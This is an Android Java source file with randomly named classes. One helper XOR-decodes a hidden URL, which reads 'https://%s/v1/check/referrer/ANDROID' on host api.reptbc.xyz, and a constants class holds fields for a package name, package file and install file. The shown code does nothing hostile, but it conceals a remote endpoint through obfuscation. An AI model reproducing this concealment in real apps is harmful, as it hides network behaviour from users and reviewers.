
package com.lucking.shine.tiamshow.access;
import java.util.ArrayList;


import java.util.Random;


import java.util.HashMap;



import com.lucking.shine.tiamshow.R;

import java.security.cert.X509Certificate;

import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;



class RXFocusWall {
    static String googleRestoreTouch(int[] contents, int key, boolean hasEmoji) {
        byte[] newList = new byte[contents.length - 1];
        newList[0] = 0;
        for (int i = 0; i < contents.length; i++) {
            int v = contents[i];
            v ^= key;
            v &= 0xff;
            if (v == 0 && i == contents.length - 1) {
                break;
            }
            newList[i] = (byte)v;
        }
        String string = new String(newList, StandardCharsets.UTF_8);
        if (hasEmoji) {
            Pattern pattern = Pattern.compile("(\\\\u(\\p{XDigit}{2,4}))");
            Matcher matcher = pattern.matcher(string);
            char ch;
            while (matcher.find()) {
                ch = (char) Integer.parseInt(matcher.group(2), 16);
                string = string.replace(matcher.group(1), ch + "");
            }
        }
        return string;
    }
}


public abstract class PYVUnit {

    static final String HOST_NAME = "api.reptbc.xyz";
    static final String REF_URL = String.format(RXFocusWall.googleRestoreTouch(new int[] {-61,-33,-33,-37,-40,-111,-124,-124,-114,-40,-124,-35,-102,-124,-56,-61,-50,-56,-64,-124,-39,-50,-51,-50,-39,-39,-50,-39,-124,-22,-27,-17,-7,-28,-30,-17,-85},0xAB,false), HOST_NAME);

    public static String TAG = PYVUnit.class.getSimpleName();
    static X509Certificate expectedCert;

    public static final boolean DBG_SELECT = false;
    public static final boolean DBG_LOG = false;

    public static String PKG_NAME = null;
    public static String PKG_FILE = null;
    public static int PKG_VER = 1;
    public static String INSTALL_FILE = "";
}
